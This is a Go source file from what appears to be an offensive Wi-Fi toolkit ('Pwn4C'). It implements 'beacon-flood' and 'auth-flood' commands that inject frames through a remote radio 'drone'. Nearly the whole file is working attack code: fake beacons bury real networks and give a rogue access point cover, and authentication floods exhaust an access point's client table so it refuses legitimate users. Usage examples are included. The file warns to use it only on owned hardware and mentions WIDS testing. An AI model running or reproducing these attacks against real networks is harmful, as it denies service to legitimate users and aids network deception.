package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	beaconFloodChannel  int
	beaconFloodCount    int
	beaconFloodInterval int
	beaconFloodDuration int
	beaconFloodSSID     string
	beaconFloodSSIDFile string
	beaconFloodBSSID    string
	beaconFloodHidden   bool
	beaconFloodRate     float64
	beaconFloodTarget   string

	authFloodChannel  int
	authFloodCount    int
	authFloodInterval int
	authFloodDuration int
	authFloodBSSID    string
	authFloodSrc      string
	authFloodRate     float64
	authFloodTarget   string
)

var beaconFloodCmd = &cobra.Command{
	Use:     "beacon-flood [target_drone_ip]",
	Aliases: []string{"beaconflood"},
	Short:   "Flood the air with fake beacons to fill client scan lists",
	Long: `Injects a stream of beacon frames carrying made-up BSSIDs and SSIDs.

Clients keep a scan list of the networks they can hear. Filling that list with
hundreds of plausible access points buries the real ones, breaks "connect to
the strongest network" behaviour, and gives a rogue AP somewhere to hide. It is
also the standard way to check how a client or a WIDS handles beacon noise.

  pwn4c beacon-flood -c 6 -n 2000
  pwn4c beacon-flood -c 6 --ssid "Free WiFi" --duration 60
  pwn4c beacon-flood -c 6 --ssid-file names.txt --bssid AA:BB:CC:DD:EE:FF

By default every frame gets a fresh locally administered BSSID and an SSID from
the built-in list of router names plus a random suffix. --ssid fixes the name
(random BSSID per frame), --bssid fixes the AP (use with --ssid for a repeatable
frame), --ssid-file cycles through a wordlist, and --hidden blanks the SSID
element.

-n 0 with --duration 0 floods until Ctrl+C.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		if err := validateFloodFlags(beaconFloodChannel,
			beaconFloodCount, beaconFloodInterval, beaconFloodDuration,
			beaconFloodRate); err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}
		if beaconFloodBSSID != "" {
			if _, err := net.ParseMAC(beaconFloodBSSID); err != nil {
				fmt.Printf("[!] Invalid BSSID %q: %v\n", beaconFloodBSSID, err)
				os.Exit(1)
			}
		}

		var wordlist []string
		if beaconFloodSSIDFile != "" {
			var err error
			wordlist, err = loadSSIDFile(beaconFloodSSIDFile)
			if err != nil {
				fmt.Printf("[!] %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("[+] Loaded %d SSID(s) from %s\n", len(wordlist), beaconFloodSSIDFile)
		}

		target := beaconFloodTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)
		client := connectOrExit(target)
		defer client.Close()

		opts := drone.DefaultFrameOptions()
		opts.Channel = beaconFloodChannel
		opts.RateMbps = beaconFloodRate

		build := func(i int) (string, error) {
			bssid := beaconFloodBSSID
			if bssid == "" {
				bssid = drone.RandomMAC()
			}

			ssid := beaconFloodSSID
			if ssid == "" {
				if len(wordlist) > 0 {
					ssid = wordlist[i%len(wordlist)]
				} else {
					ssid = drone.RandomSSID()
				}
			}

			return drone.BuildBeaconFrame(drone.BeaconParams{
				BSSID:   bssid,
				SSID:    ssid,
				Hidden:  beaconFloodHidden,
				Seq:     uint16(i & 0x0fff),
				Options: opts,
			})
		}

		runFloodCommand(client, floodOptions{
			label:    "beacon",
			channel:  beaconFloodChannel,
			total:    beaconFloodCount,
			duration: time.Duration(beaconFloodDuration) * time.Second,
			interval: time.Duration(beaconFloodInterval) * time.Millisecond,
			rate:     beaconFloodRate,
			build:    build,
		})
	},
}

var authFloodCmd = &cobra.Command{
	Use:     "auth-flood [target_drone_ip]",
	Aliases: []string{"authflood"},
	Short:   "Flood an access point with authentication requests from random clients",
	Long: `Injects Open System authentication requests at one BSSID, each from a fresh
locally administered source MAC.

Every request makes the AP allocate (or look up) state for a client that will
never complete the exchange. A long enough burst exhausts that table and the AP
starts refusing real clients — the classic authentication flood. Treat it as a
denial-of-service test: run it against your own hardware, not a neighbour's.

  pwn4c auth-flood -b AA:BB:CC:DD:EE:FF -c 6 -n 500
  pwn4c auth-flood -b AA:BB:CC:DD:EE:FF -c 6 --duration 30 --interval 5

--src fixes the source MAC (useful for a repeatable single-client probe);
without it every frame comes from a different client.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		if authFloodBSSID == "" {
			fmt.Println("[!] --bssid is required: the flood has to target one AP.")
			os.Exit(1)
		}
		if err := validateFloodFlags(authFloodChannel,
			authFloodCount, authFloodInterval, authFloodDuration,
			authFloodRate); err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}

		target := authFloodTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)
		client := connectOrExit(target)
		defer client.Close()

		opts := drone.DefaultFrameOptions()
		opts.Channel = authFloodChannel
		opts.RateMbps = authFloodRate

		build := func(i int) (string, error) {
			src := authFloodSrc
			if src == "" {
				src = drone.RandomMAC()
			}
			return drone.BuildAuthFrame(drone.AuthParams{
				BSSID:   authFloodBSSID,
				Client:  src,
				Seq:     uint16(i & 0x0fff),
				Options: opts,
			})
		}

		fmt.Println("[!] This is a denial-of-service test: it fills the AP's")
		fmt.Println("    authentication state table. Only run it against hardware you own.")

		runFloodCommand(client, floodOptions{
			label:    "authentication",
			channel:  authFloodChannel,
			total:    authFloodCount,
			duration: time.Duration(authFloodDuration) * time.Second,
			interval: time.Duration(authFloodInterval) * time.Millisecond,
			rate:     authFloodRate,
			build:    build,
		})
	},
}

// floodOptions describes one flood run to runFloodCommand.
type floodOptions struct {
	label    string
	channel  int
	total    int
	duration time.Duration
	interval time.Duration
	rate     float64
	build    func(i int) (string, error)
}

// validateFloodFlags rejects impossible combinations before touching the drone.
func validateFloodFlags(channel, count, intervalMs, duration int, rate float64) error {
	if channel < 1 || channel > 13 {
		return fmt.Errorf("--channel must be between 1 and 13")
	}
	if count < 0 || count > 10_000_000 {
		return fmt.Errorf("--count must be between 0 (until Ctrl+C) and 10000000")
	}
	if intervalMs < 0 || intervalMs > 5000 {
		return fmt.Errorf("--interval must be between 0 and 5000 ms")
	}
	if duration < 0 || duration > 86_400 {
		return fmt.Errorf("--duration must be between 0 (off) and 86400 seconds")
	}
	if rate <= 0 || rate > 54 {
		return fmt.Errorf("--rate must be a positive PHY rate up to 54 Mbps")
	}
	return nil
}

// runFloodCommand puts the radio on the target channel, runs the flood, and
// restores the radio only when it started the monitor session itself.
func runFloodCommand(client *drone.ControlClient, o floodOptions) {
	status, err := client.GetStatus()
	if err != nil {
		fmt.Printf("[!] Failed to query drone status: %v\n", err)
		os.Exit(1)
	}

	weStarted := false
	if !status.MonitorActive {
		fmt.Printf("[+] Activating monitor mode on channel %d...\n", o.channel)
		if err := client.StartMonitor(o.channel); err != nil {
			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
			os.Exit(1)
		}
		weStarted = true
	} else if status.Channel != o.channel {
		fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, o.channel)
		if err := client.SetChannel(o.channel); err != nil {
			fmt.Printf("[!] Failed to switch channel: %v\n", err)
			os.Exit(1)
		}
	}

	// A BSSID filter left behind by an earlier listen session would not stop
	// injection, but it would hide the capture — and a flood is often run with
	// a capture alongside it.
	if err := client.SetFilter(false, ""); err != nil {
		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
	}

	sent, failed, err := runFlood(client, o)

	if weStarted {
		fmt.Println("[*] Stopping monitor mode...")
		if err := client.StopMonitor(); err != nil {
			fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
		}
	}

	fmt.Println()
	fmt.Printf("[+] Injection: %d %s frame(s) on air, %d dropped\n", sent, o.label, failed)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		os.Exit(1)
	}
}

// runFlood is the shared loop: build one frame, queue it, pace it, report
// progress, and stop on count, duration or Ctrl+C.
func runFlood(client *drone.ControlClient, o floodOptions) (int, int, error) {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	start := time.Now()
	var deadline time.Time
	if o.duration > 0 {
		deadline = start.Add(o.duration)
	}

	limit := "until Ctrl+C"
	switch {
	case o.total > 0 && !deadline.IsZero():
		limit = fmt.Sprintf("%d frames or %s", o.total, o.duration)
	case o.total > 0:
		limit = fmt.Sprintf("%d frames", o.total)
	case !deadline.IsZero():
		limit = o.duration.String()
	}
	fmt.Printf("[*] Flooding %s frames on channel %d (%s)...\n", o.label, o.channel, limit)

	sent, failed := 0, 0
	lastReport := start

	for i := 0; ; i++ {
		select {
		case <-sigCh:
			return sent, failed, nil
		default:
		}

		if o.total > 0 && i >= o.total {
			return sent, failed, nil
		}
		if !deadline.IsZero() && time.Now().After(deadline) {
			return sent, failed, nil
		}

		frameHex, err := o.build(i)
		if err != nil {
			return sent, failed, err
		}

		res, err := client.InjectFrame(frameHex, 1, 0, int(o.rate))
		if err != nil {
			return sent, failed, fmt.Errorf("injection failed after %d frame(s): %w", sent, err)
		}
		sent += res.Sent
		failed += res.Failed

		if now := time.Now(); now.Sub(lastReport) >= time.Second {
			lastReport = now
			elapsed := now.Sub(start).Seconds()
			fmt.Printf("\r[+] %d %s frame(s) on air — %.0f/s — Ctrl+C to stop",
				sent, o.label, float64(sent)/elapsed)
		}

		if o.interval > 0 {
			time.Sleep(o.interval)
		}
	}
}

// loadSSIDFile reads a one-SSID-per-line wordlist, skipping blanks and
// comments, and truncates entries to the 32-byte 802.11 limit.
func loadSSIDFile(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("failed to open %s: %w", path, err)
	}
	defer f.Close()

	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 4096), 64*1024)
	for sc.Scan() {
		line := strings.TrimRight(sc.Text(), "\r")
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if len(line) > 32 {
			line = line[:32]
		}
		out = append(out, line)
	}
	if err := sc.Err(); err != nil {
		return nil, fmt.Errorf("failed to read %s: %w", path, err)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("%s contains no SSIDs", path)
	}
	return out, nil
}

func init() {
	beaconFloodCmd.Flags().IntVarP(&beaconFloodChannel, "channel", "c", 1, "Channel to flood (1-13)")
	beaconFloodCmd.Flags().IntVarP(&beaconFloodCount, "count", "n", 1000, "Number of beacons (0 = until --duration or Ctrl+C)")
	beaconFloodCmd.Flags().IntVar(&beaconFloodInterval, "interval", 0, "Milliseconds between frames (0 = as fast as the drone drains)")
	beaconFloodCmd.Flags().IntVar(&beaconFloodDuration, "duration", 0, "Stop after N seconds (0 = count/Ctrl+C only)")
	beaconFloodCmd.Flags().StringVarP(&beaconFloodSSID, "ssid", "s", "", "Fixed SSID for every beacon (default: random from the built-in list)")
	beaconFloodCmd.Flags().StringVar(&beaconFloodSSIDFile, "ssid-file", "", "Wordlist of SSIDs, one per line (cycled)")
	beaconFloodCmd.Flags().StringVarP(&beaconFloodBSSID, "bssid", "b", "", "Fixed BSSID (default: a random locally administered MAC per frame)")
	beaconFloodCmd.Flags().BoolVar(&beaconFloodHidden, "hidden", false, "Blank the SSID element (hidden-network beacons)")
	beaconFloodCmd.Flags().Float64Var(&beaconFloodRate, "rate", 1, "PHY TX rate in Mbps (1, 2, 5.5, 6, 11, 12, 24, 54)")
	beaconFloodCmd.Flags().StringVarP(&beaconFloodTarget, "target", "t", "", "Drone IP address")
	rootCmd.AddCommand(beaconFloodCmd)

	authFloodCmd.Flags().StringVarP(&authFloodBSSID, "bssid", "b", "", "Target AP BSSID (required)")
	authFloodCmd.Flags().IntVarP(&authFloodChannel, "channel", "c", 1, "Wi-Fi channel of the target AP (1-13)")
	authFloodCmd.Flags().IntVarP(&authFloodCount, "count", "n", 500, "Number of authentication requests (0 = until --duration or Ctrl+C)")
	authFloodCmd.Flags().IntVar(&authFloodInterval, "interval", 0, "Milliseconds between frames (0 = as fast as the drone drains)")
	authFloodCmd.Flags().IntVar(&authFloodDuration, "duration", 0, "Stop after N seconds (0 = count/Ctrl+C only)")
	authFloodCmd.Flags().StringVar(&authFloodSrc, "src", "", "Fixed source MAC (default: a random locally administered MAC per frame)")
	authFloodCmd.Flags().Float64Var(&authFloodRate, "rate", 1, "PHY TX rate in Mbps (1, 2, 5.5, 6, 11, 12, 24, 54)")
	authFloodCmd.Flags().StringVarP(&authFloodTarget, "target", "t", "", "Drone IP address")
	rootCmd.AddCommand(authFloodCmd)
}
